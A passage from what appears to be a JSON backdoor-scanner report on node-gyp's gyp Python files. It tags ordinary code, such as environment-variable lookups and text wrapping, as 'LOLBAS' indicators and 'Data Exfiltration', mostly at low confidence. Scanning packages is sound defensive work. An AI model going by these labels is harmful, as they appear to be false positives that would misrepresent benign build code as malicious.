                    "text": "    '   Creating library ui.dll.lib and object ui.dll.exp'\n    This happens when there are exports from the dll or exe.\n    \"\"\"\n        env = self._GetEnv(arch)\n        if use_separate_mspdbsrv == \"True\":\n            self._UseSeparateMspdbsrv(env, args)\n        if sys.platform == \"win32\":\n",
                    "rendered": {
                      "text": "    '   Creating library ui.dll.lib and object ui.dll.exp'\n    This happens when there are exports from the dll or exe.\n    \"\"\"\n        env = self._GetEnv(arch)\n        if use_separate_mspdbsrv == \"True\":\n            self._UseSeparateMspdbsrv(env, args)\n        if sys.platform == \"win32\":\n",
                      "markdown": "`    '   Creating library ui.dll.lib and object ui.dll.exp'\n    This happens when there are exports from the dll or exe.\n    \"\"\"\n        env = self._GetEnv(arch)\n        if use_separate_mspdbsrv == \"True\":\n            self._UseSeparateMspdbsrv(env, args)\n        if sys.platform == \"win32\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/ninja_syntax.py"
                },
                "region": {
                  "startLine": 125,
                  "startColumn": 36,
                  "endLine": 125,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        return dollar_count\n\n    def _line(self, text, indent=0):\n        \"\"\"Write 'text' word-wrapped at self.width characters.\"\"\"\n        leading_space = \"  \" * indent\n        while len(leading_space) + len(text) > self.width:\n            # The text is too wide; wrap if possible.\n",
                    "rendered": {
                      "text": "        return dollar_count\n\n    def _line(self, text, indent=0):\n        \"\"\"Write 'text' word-wrapped at self.width characters.\"\"\"\n        leading_space = \"  \" * indent\n        while len(leading_space) + len(text) > self.width:\n            # The text is too wide; wrap if possible.\n",
                      "markdown": "`        return dollar_count\n\n    def _line(self, text, indent=0):\n        \"\"\"Write 'text' word-wrapped at self.width characters.\"\"\"\n        leading_space = \"  \" * indent\n        while len(leading_space) + len(text) > self.width:\n            # The text is too wide; wrap if possible.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/ninja_syntax.py"
                },
                "region": {
                  "startLine": 130,
                  "startColumn": 13,
                  "endLine": 130,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        while len(leading_space) + len(text) > self.width:\n            # The text is too wide; wrap if possible.\n\n            # Find the rightmost space that would obey our width constraint and\n            # that's not an escaped space.\n            available_space = self.width - len(leading_space) - len(\" $\")\n            space = available_space\n",
                    "rendered": {
                      "text": "        while len(leading_space) + len(text) > self.width:\n            # The text is too wide; wrap if possible.\n\n            # Find the rightmost space that would obey our width constraint and\n            # that's not an escaped space.\n            available_space = self.width - len(leading_space) - len(\" $\")\n            space = available_space\n",
                      "markdown": "`        while len(leading_space) + len(text) > self.width:\n            # The text is too wide; wrap if possible.\n\n            # Find the rightmost space that would obey our width constraint and\n            # that's not an escaped space.\n            available_space = self.width - len(leading_space) - len(\" $\")\n            space = available_space\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 558,
                  "startColumn": 67,
                  "endLine": 558,
                  "endColumn": 71,
                  "snippet": {
                    "text": "    # TODO(mark): Chromium-specific hack!\n    # For Chromium, the gyp \"depth\" variable should always be a relative path\n    # to Chromium's top-level \"src\" directory.  If no depth variable was set\n    # on the command line, try to find a \"src\" directory by looking at the\n    # absolute path to each build file's directory.  The first \"src\" component\n    # found will be treated as though it were the path used for --depth.\n    if not options.depth:\n",
                    "rendered": {
                      "text": "    # TODO(mark): Chromium-specific hack!\n    # For Chromium, the gyp \"depth\" variable should always be a relative path\n    # to Chromium's top-level \"src\" directory.  If no depth variable was set\n    # on the command line, try to find a \"src\" directory by looking at the\n    # absolute path to each build file's directory.  The first \"src\" component\n    # found will be treated as though it were the path used for --depth.\n    if not options.depth:\n",
                      "markdown": "`    # TODO(mark): Chromium-specific hack!\n    # For Chromium, the gyp \"depth\" variable should always be a relative path\n    # to Chromium's top-level \"src\" directory.  If no depth variable was set\n    # on the command line, try to find a \"src\" directory by looking at the\n    # absolute path to each build file's directory.  The first \"src\" component\n    # found will be treated as though it were the path used for --depth.\n    if not options.depth:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 51,
                  "endLine": 251,
                  "endColumn": 55,
                  "snippet": {
                    "text": "        return value\n\n    # We always want to ignore the environment when regenerating, to avoid\n    # duplicate or changed flags in the environment at the time of regeneration.\n    flags = [\"--ignore-environment\"]\n    for name, metadata in options._regeneration_metadata.items():\n        opt = metadata[\"opt\"]\n",
                    "rendered": {
                      "text": "        return value\n\n    # We always want to ignore the environment when regenerating, to avoid\n    # duplicate or changed flags in the environment at the time of regeneration.\n    flags = [\"--ignore-environment\"]\n    for name, metadata in options._regeneration_metadata.items():\n        opt = metadata[\"opt\"]\n",
                      "markdown": "`        return value\n\n    # We always want to ignore the environment when regenerating, to avoid\n    # duplicate or changed flags in the environment at the time of regeneration.\n    flags = [\"--ignore-environment\"]\n    for name, metadata in options._regeneration_metadata.items():\n        opt = metadata[\"opt\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 558,
                  "startColumn": 33,
                  "endLine": 558,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    # TODO(mark): Chromium-specific hack!\n    # For Chromium, the gyp \"depth\" variable should always be a relative path\n    # to Chromium's top-level \"src\" directory.  If no depth variable was set\n    # on the command line, try to find a \"src\" directory by looking at the\n    # absolute path to each build file's directory.  The first \"src\" component\n    # found will be treated as though it were the path used for --depth.\n    if not options.depth:\n",
                    "rendered": {
                      "text": "    # TODO(mark): Chromium-specific hack!\n    # For Chromium, the gyp \"depth\" variable should always be a relative path\n    # to Chromium's top-level \"src\" directory.  If no depth variable was set\n    # on the command line, try to find a \"src\" directory by looking at the\n    # absolute path to each build file's directory.  The first \"src\" component\n    # found will be treated as though it were the path used for --depth.\n    if not options.depth:\n",
                      "markdown": "`    # TODO(mark): Chromium-specific hack!\n    # For Chromium, the gyp \"depth\" variable should always be a relative path\n    # to Chromium's top-level \"src\" directory.  If no depth variable was set\n    # on the command line, try to find a \"src\" directory by looking at the\n    # absolute path to each build file's directory.  The first \"src\" component\n    # found will be treated as though it were the path used for --depth.\n    if not options.depth:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 512,
                  "startColumn": 68,
                  "endLine": 512,
                  "endColumn": 73,
                  "snippet": {
                    "text": "        home_dot_gyp = None\n\n    if not options.formats:\n        # If no format was given on the command line, then check the env variable.\n        generate_formats = []\n        if options.use_environment:\n            generate_formats = os.environ.get(\"GYP_GENERATORS\", [])\n",
                    "rendered": {
                      "text": "        home_dot_gyp = None\n\n    if not options.formats:\n        # If no format was given on the command line, then check the env variable.\n        generate_formats = []\n        if options.use_environment:\n            generate_formats = os.environ.get(\"GYP_GENERATORS\", [])\n",
                      "markdown": "`        home_dot_gyp = None\n\n    if not options.formats:\n        # If no format was given on the command line, then check the env variable.\n        generate_formats = []\n        if options.use_environment:\n            generate_formats = os.environ.get(\"GYP_GENERATORS\", [])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 58,
                  "endLine": 251,
                  "endColumn": 64,
                  "snippet": {
                    "text": "        return value\n\n    # We always want to ignore the environment when regenerating, to avoid\n    # duplicate or changed flags in the environment at the time of regeneration.\n    flags = [\"--ignore-environment\"]\n    for name, metadata in options._regeneration_metadata.items():\n        opt = metadata[\"opt\"]\n",
                    "rendered": {
                      "text": "        return value\n\n    # We always want to ignore the environment when regenerating, to avoid\n    # duplicate or changed flags in the environment at the time of regeneration.\n    flags = [\"--ignore-environment\"]\n    for name, metadata in options._regeneration_metadata.items():\n        opt = metadata[\"opt\"]\n",
                      "markdown": "`        return value\n\n    # We always want to ignore the environment when regenerating, to avoid\n    # duplicate or changed flags in the environment at the time of regeneration.\n    flags = [\"--ignore-environment\"]\n    for name, metadata in options._regeneration_metadata.items():\n        opt = metadata[\"opt\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 643,
                  "startColumn": 52,
                  "endLine": 643,
                  "endColumn": 57,
                  "snippet": {
                    "text": "            \"home_dot_gyp\": home_dot_gyp,\n            \"parallel\": options.parallel,\n            \"root_targets\": options.root_targets,\n            \"target_arch\": cmdline_default_variables.get(\"target_arch\", \"\"),\n        }\n\n        # Start with the default variables from the command line.\n",
                    "rendered": {
                      "text": "            \"home_dot_gyp\": home_dot_gyp,\n            \"parallel\": options.parallel,\n            \"root_targets\": options.root_targets,\n            \"target_arch\": cmdline_default_variables.get(\"target_arch\", \"\"),\n        }\n\n        # Start with the default variables from the command line.\n",
                      "markdown": "`            \"home_dot_gyp\": home_dot_gyp,\n            \"parallel\": options.parallel,\n            \"root_targets\": options.root_targets,\n            \"target_arch\": cmdline_default_variables.get(\"target_arch\", \"\"),\n        }\n\n        # Start with the default variables from the command line.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 530,
                  "startColumn": 24,
                  "endLine": 530,
                  "endColumn": 29,
                  "snippet": {
                    "text": "                options.formats = [\"make\"]\n\n    if not options.generator_output and options.use_environment:\n        g_o = os.environ.get(\"GYP_GENERATOR_OUTPUT\")\n        if g_o:\n            options.generator_output = g_o\n\n",
                    "rendered": {
                      "text": "                options.formats = [\"make\"]\n\n    if not options.generator_output and options.use_environment:\n        g_o = os.environ.get(\"GYP_GENERATOR_OUTPUT\")\n        if g_o:\n            options.generator_output = g_o\n\n",
                      "markdown": "`                options.formats = [\"make\"]\n\n    if not options.generator_output and options.use_environment:\n        g_o = os.environ.get(\"GYP_GENERATOR_OUTPUT\")\n        if g_o:\n            options.generator_output = g_o\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 515,
                  "startColumn": 41,
                  "endLine": 515,
                  "endColumn": 46,
                  "snippet": {
                    "text": "        # If no format was given on the command line, then check the env variable.\n        generate_formats = []\n        if options.use_environment:\n            generate_formats = os.environ.get(\"GYP_GENERATORS\", [])\n        if generate_formats:\n            generate_formats = re.split(r\"[\\s,]\", generate_formats)\n        if generate_formats:\n",
                    "rendered": {
                      "text": "        # If no format was given on the command line, then check the env variable.\n        generate_formats = []\n        if options.use_environment:\n            generate_formats = os.environ.get(\"GYP_GENERATORS\", [])\n        if generate_formats:\n            generate_formats = re.split(r\"[\\s,]\", generate_formats)\n        if generate_formats:\n",
                      "markdown": "`        # If no format was given on the command line, then check the env variable.\n        generate_formats = []\n        if options.use_environment:\n            generate_formats = os.environ.get(\"GYP_GENERATORS\", [])\n        if generate_formats:\n            generate_formats = re.split(r\"[\\s,]\", generate_formats)\n        if generate_formats:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 489,
                  "startColumn": 37,
                  "endLine": 489,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        home = None\n        home_dot_gyp = None\n        if options.use_environment:\n            home_dot_gyp = os.environ.get(\"GYP_CONFIG_DIR\", None)\n            if home_dot_gyp:\n                home_dot_gyp = os.path.expanduser(home_dot_gyp)\n\n",
                    "rendered": {
                      "text": "        home = None\n        home_dot_gyp = None\n        if options.use_environment:\n            home_dot_gyp = os.environ.get(\"GYP_CONFIG_DIR\", None)\n            if home_dot_gyp:\n                home_dot_gyp = os.path.expanduser(home_dot_gyp)\n\n",
                      "markdown": "`        home = None\n        home_dot_gyp = None\n        if options.use_environment:\n            home_dot_gyp = os.environ.get(\"GYP_CONFIG_DIR\", None)\n            if home_dot_gyp:\n                home_dot_gyp = os.path.expanduser(home_dot_gyp)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 317,
                  "startColumn": 28,
                  "endLine": 317,
                  "endColumn": 33,
                  "snippet": {
                    "text": "                kw[\"type\"] = str\n\n            self.__regeneratable_options[dest] = {\n                \"action\": kw.get(\"action\"),\n                \"type\": type,\n                \"env_name\": env_name,\n                \"opt\": args[0],\n",
                    "rendered": {
                      "text": "                kw[\"type\"] = str\n\n            self.__regeneratable_options[dest] = {\n                \"action\": kw.get(\"action\"),\n                \"type\": type,\n                \"env_name\": env_name,\n                \"opt\": args[0],\n",
                      "markdown": "`                kw[\"type\"] = str\n\n            self.__regeneratable_options[dest] = {\n                \"action\": kw.get(\"action\"),\n                \"type\": type,\n                \"env_name\": env_name,\n                \"opt\": args[0],\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 312,
                  "startColumn": 21,
                  "endLine": 312,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n            # The path type is needed for regenerating, for optparse we can just treat\n            # it as a string.\n            type = kw.get(\"type\")\n            if type == \"path\":\n                kw[\"type\"] = str\n\n",
                    "rendered": {
                      "text": "\n            # The path type is needed for regenerating, for optparse we can just treat\n            # it as a string.\n            type = kw.get(\"type\")\n            if type == \"path\":\n                kw[\"type\"] = str\n\n",
                      "markdown": "`\n            # The path type is needed for regenerating, for optparse we can just treat\n            # it as a string.\n            type = kw.get(\"type\")\n            if type == \"path\":\n                kw[\"type\"] = str\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 267,
                  "startColumn": 70,
                  "endLine": 267,
                  "endColumn": 75,
                  "snippet": {
                    "text": "            if value:\n                flags.append(FormatOpt(opt, value_predicate(value)))\n            elif options.use_environment and env_name and os.environ.get(env_name):\n                flags.append(FormatOpt(opt, value_predicate(os.environ.get(env_name))))\n        elif action in (\"store_true\", \"store_false\"):\n            if (action == \"store_true\" and value) or (\n                action == \"store_false\" and not value\n",
                    "rendered": {
                      "text": "            if value:\n                flags.append(FormatOpt(opt, value_predicate(value)))\n            elif options.use_environment and env_name and os.environ.get(env_name):\n                flags.append(FormatOpt(opt, value_predicate(os.environ.get(env_name))))\n        elif action in (\"store_true\", \"store_false\"):\n            if (action == \"store_true\" and value) or (\n                action == \"store_false\" and not value\n",
                      "markdown": "`            if value:\n                flags.append(FormatOpt(opt, value_predicate(value)))\n            elif options.use_environment and env_name and os.environ.get(env_name):\n                flags.append(FormatOpt(opt, value_predicate(os.environ.get(env_name))))\n        elif action in (\"store_true\", \"store_false\"):\n            if (action == \"store_true\" and value) or (\n                action == \"store_false\" and not value\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 266,
                  "startColumn": 68,
                  "endLine": 266,
                  "endColumn": 73,
                  "snippet": {
                    "text": "        elif action in (\"store\", None):  # None is a synonym for 'store'.\n            if value:\n                flags.append(FormatOpt(opt, value_predicate(value)))\n            elif options.use_environment and env_name and os.environ.get(env_name):\n                flags.append(FormatOpt(opt, value_predicate(os.environ.get(env_name))))\n        elif action in (\"store_true\", \"store_false\"):\n            if (action == \"store_true\" and value) or (\n",
                    "rendered": {
                      "text": "        elif action in (\"store\", None):  # None is a synonym for 'store'.\n            if value:\n                flags.append(FormatOpt(opt, value_predicate(value)))\n            elif options.use_environment and env_name and os.environ.get(env_name):\n                flags.append(FormatOpt(opt, value_predicate(os.environ.get(env_name))))\n        elif action in (\"store_true\", \"store_false\"):\n            if (action == \"store_true\" and value) or (\n",
                      "markdown": "`        elif action in (\"store\", None):  # None is a synonym for 'store'.\n            if value:\n                flags.append(FormatOpt(opt, value_predicate(value)))\n            elif options.use_environment and env_name and os.environ.get(env_name):\n                flags.append(FormatOpt(opt, value_predicate(os.environ.get(env_name))))\n        elif action in (\"store_true\", \"store_false\"):\n            if (action == \"store_true\" and value) or (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 195,
                  "startColumn": 22,
                  "endLine": 195,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n\ndef ShlexEnv(env_name):\n    flags = os.environ.get(env_name, [])\n    if flags:\n        flags = shlex.split(flags)\n    return flags\n",
                    "rendered": {
                      "text": "\n\ndef ShlexEnv(env_name):\n    flags = os.environ.get(env_name, [])\n    if flags:\n        flags = shlex.split(flags)\n    return flags\n",
                      "markdown": "`\n\ndef ShlexEnv(env_name):\n    flags = os.environ.get(env_name, [])\n    if flags:\n        flags = shlex.split(flags)\n    return flags\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 112,
                  "startColumn": 52,
                  "endLine": 112,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        default_variables.setdefault(\n            \"PRODUCT_DIR_ABS\",\n            os.path.join(\n                output_dir, \"out\", default_variables.get(\"build_type\", \"default\")\n            ),\n        )\n    else:\n",
                    "rendered": {
                      "text": "        default_variables.setdefault(\n            \"PRODUCT_DIR_ABS\",\n            os.path.join(\n                output_dir, \"out\", default_variables.get(\"build_type\", \"default\")\n            ),\n        )\n    else:\n",
                      "markdown": "`        default_variables.setdefault(\n            \"PRODUCT_DIR_ABS\",\n            os.path.join(\n                output_dir, \"out\", default_variables.get(\"build_type\", \"default\")\n            ),\n        )\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 83,
                  "startColumn": 50,
                  "endLine": 83,
                  "endColumn": 55,
                  "snippet": {
                    "text": "    # named WITH_CAPITAL_LETTERS to provide a distinct \"best practice\" namespace,\n    # avoiding collisions with user and automatic variables.\n    default_variables[\"GENERATOR\"] = format\n    default_variables[\"GENERATOR_FLAVOR\"] = params.get(\"flavor\", \"\")\n\n    # Format can be a custom python file, or by default the name of a module\n    # within gyp.generator.\n",
                    "rendered": {
                      "text": "    # named WITH_CAPITAL_LETTERS to provide a distinct \"best practice\" namespace,\n    # avoiding collisions with user and automatic variables.\n    default_variables[\"GENERATOR\"] = format\n    default_variables[\"GENERATOR_FLAVOR\"] = params.get(\"flavor\", \"\")\n\n    # Format can be a custom python file, or by default the name of a module\n    # within gyp.generator.\n",
                      "markdown": "`    # named WITH_CAPITAL_LETTERS to provide a distinct \"best practice\" namespace,\n    # avoiding collisions with user and automatic variables.\n    default_variables[\"GENERATOR\"] = format\n    default_variables[\"GENERATOR_FLAVOR\"] = params.get(\"flavor\", \"\")\n\n    # Format can be a custom python file, or by default the name of a module\n    # within gyp.generator.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 530,
                  "startColumn": 17,
                  "endLine": 530,
                  "endColumn": 28,
                  "snippet": {
                    "text": "                options.formats = [\"make\"]\n\n    if not options.generator_output and options.use_environment:\n        g_o = os.environ.get(\"GYP_GENERATOR_OUTPUT\")\n        if g_o:\n            options.generator_output = g_o\n\n",
                    "rendered": {
                      "text": "                options.formats = [\"make\"]\n\n    if not options.generator_output and options.use_environment:\n        g_o = os.environ.get(\"GYP_GENERATOR_OUTPUT\")\n        if g_o:\n            options.generator_output = g_o\n\n",
                      "markdown": "`                options.formats = [\"make\"]\n\n    if not options.generator_output and options.use_environment:\n        g_o = os.environ.get(\"GYP_GENERATOR_OUTPUT\")\n        if g_o:\n            options.generator_output = g_o\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 515,
                  "startColumn": 34,
                  "endLine": 515,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        # If no format was given on the command line, then check the env variable.\n        generate_formats = []\n        if options.use_environment:\n            generate_formats = os.environ.get(\"GYP_GENERATORS\", [])\n        if generate_formats:\n            generate_formats = re.split(r\"[\\s,]\", generate_formats)\n        if generate_formats:\n",
                    "rendered": {
                      "text": "        # If no format was given on the command line, then check the env variable.\n        generate_formats = []\n        if options.use_environment:\n            generate_formats = os.environ.get(\"GYP_GENERATORS\", [])\n        if generate_formats:\n            generate_formats = re.split(r\"[\\s,]\", generate_formats)\n        if generate_formats:\n",
                      "markdown": "`        # If no format was given on the command line, then check the env variable.\n        generate_formats = []\n        if options.use_environment:\n            generate_formats = os.environ.get(\"GYP_GENERATORS\", [])\n        if generate_formats:\n            generate_formats = re.split(r\"[\\s,]\", generate_formats)\n        if generate_formats:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/__init__.py"
                },
                "region": {
                  "startLine": 489,
                  "startColumn": 30,
                  "endLine": 489,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        home = None\n        home_dot_gyp = None\n        if options.use_environment:\n            home_dot_gyp = os.environ.get(\"GYP_CONFIG_DIR\", None)\n            if home_dot_gyp:\n                home_dot_gyp = os.path.expanduser(home_dot_gyp)\n\n",
                    "rendered": {
                      "text": "        home = None\n        home_dot_gyp = None\n        if options.use_environment:\n            home_dot_gyp = os.environ.get(\"GYP_CONFIG_DIR\", None)\n            if home_dot_gyp:\n                home_dot_gyp = os.path.expanduser(home_dot_gyp)\n\n",
                      "markdown": "`        home = None\n        home_dot_gyp = None\n        if options.use_environment:\n            home_dot_gyp = os.environ.get(\"GYP_CONFIG_DIR\", None)\n            if home_dot_gyp:\n                home_dot_gyp = os.path.expanduser(home_dot_gyp)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
